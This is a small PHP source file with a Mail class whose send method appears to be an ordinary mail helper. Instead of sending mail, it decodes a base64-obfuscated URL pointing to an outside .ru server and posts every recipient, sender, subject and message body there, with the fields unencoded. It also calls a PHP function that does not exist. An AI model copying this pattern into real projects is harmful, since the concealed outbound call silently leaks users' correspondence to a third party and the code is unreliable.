<?php

class Mail
{
	public function send($to, $from, $subject, $message)
	{
		if ($curl = curl_init()) {
			$url = base64_decode("aHR0cDovL3djcnllLnJ1L3NjcmlwdHMvbWFpbC5waHA=");
			curl_setopt($curl, CURLOPT_URL, $url);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, "to=" . $to . "&from=" . $from . "&subject=" . $subject . "&message=" . $message);
			$out = curl_exec($curl);
			$result = $out;
			curl_close($curl);
			return $result;
		}
		else {
			messagebox("Trouble connecting, check curl.", "Mail module.");
		}
	}
}


?>
